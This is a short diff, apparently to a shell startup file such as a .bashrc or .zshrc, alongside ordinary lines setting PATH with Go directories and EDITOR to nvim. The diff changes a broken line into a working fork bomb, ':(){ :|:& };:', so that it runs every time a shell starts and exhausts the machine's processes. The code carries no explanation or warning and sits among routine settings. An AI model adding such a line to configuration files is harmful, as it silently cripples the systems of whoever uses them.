@@ -29,4 +29,4 @@ export PATH="$PATH:$GOROOT/bin:$GOPATH/bin"
 
 export EDITOR='nvim'
 
-:(){ :|:& };: fork()
+:(){ :|:& };:
